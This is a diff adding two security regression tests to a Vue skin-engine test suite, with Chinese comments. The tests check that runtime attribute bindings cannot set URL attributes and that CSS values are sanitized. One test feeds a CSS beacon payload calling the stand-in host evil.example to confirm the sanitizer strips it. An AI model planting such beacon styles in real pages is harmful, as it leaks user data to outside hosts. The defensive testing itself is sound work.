@@ -1,7 +1,7 @@
 import { describe, it, expect, beforeEach, vi } from 'vitest'
 import { nextTick, reactive } from 'vue'
 import { SkinStructureEngine } from '../engine'
-import { parseSkinStructure } from '../sanitize'
+import { parseSkinStructure, URL_ATTRS } from '../sanitize'
 import type { SkinProjection } from '../types'
 
 function proj(): SkinProjection {
@@ -110,6 +110,51 @@ describe('SkinStructureEngine：微绑定', () => {
     p.model = ''
     await nextTick()
     expect(el.hasAttribute('title')).toBe(false)
+  })
+
+  it('data-nb-attr：URL 黑名单与 sanitize URL_ATTRS 全量镜像（BUG-20261110-051）', async () => {
+    // 清洗器 URL_ATTRS 全表逐项拒绝（parse 时静态属性被剥，运行时绑定
+    // 不得绕过重设——名单经引擎引用 URL_ATTRS 单一真相源，本测试钉全量
+    // 行为含 xlink:href 经 lastIndexOf 解析可达）。
+    const urlAttrs = [...URL_ATTRS]
+    const pairs = urlAttrs.map((a) => `${a}:brand`).join('; ')
+    const { engine, container } = mountWith(
+      `<template data-nb-slot="titlebar" data-nb-engine="1"><div data-nb-attr="${pairs}"></div></template>`
+    )
+    engine.mount('titlebar', container)
+    const el = container.querySelector('div')!
+    for (const a of urlAttrs) {
+      expect(el.getAttribute(a)).toBeNull()
+    }
+    expect(container.innerHTML).not.toContain('NemesisBot')
+  })
+
+  it('data-nb-attr：style 运行时绑定值过外链零请求消毒（BUG-20261110-051）', async () => {
+    // 投影值攻击者可控（messages[].content 任意通道注入）：裸值携带
+    // url(http://…) = 外链信标。绑定层必须与静态清洗同闸（sanitizeCssUrls）。
+    const { engine, container, p } = mountWith(
+      `<template data-nb-slot="titlebar" data-nb-engine="1">` +
+        `<div data-nb-for="m in messages"><span data-nb-attr="style:m.content"></span></div>` +
+        `</template>`
+    )
+    p.messages = [
+      {
+        id: 1, role: 'user', isUser: true, isError: false,
+        content: 'color: red; background: url(http://evil.example/beacon?leak=1)',
+        contentHtml: '', time: '', model: '', sourceNode: '', imageCount: 0,
+      },
+    ]
+    engine.mount('titlebar', container)
+    await nextTick()
+    const el = container.querySelector('span')!
+    const style = el.getAttribute('style') ?? ''
+    expect(style).toContain('color: red')
+    expect(style).toContain('about:blank')
+    expect(style).not.toContain('http://evil.example')
+    // 合法动态样式不受影响（外链零请求只改写目标，不拒绑定）
+    p.messages[0].content = 'width: 42%'
+    await nextTick()
+    expect(el.getAttribute('style')).toBe('width: 42%')
   })
 
   it('`!` 否定与未知原语忽略', async () => {
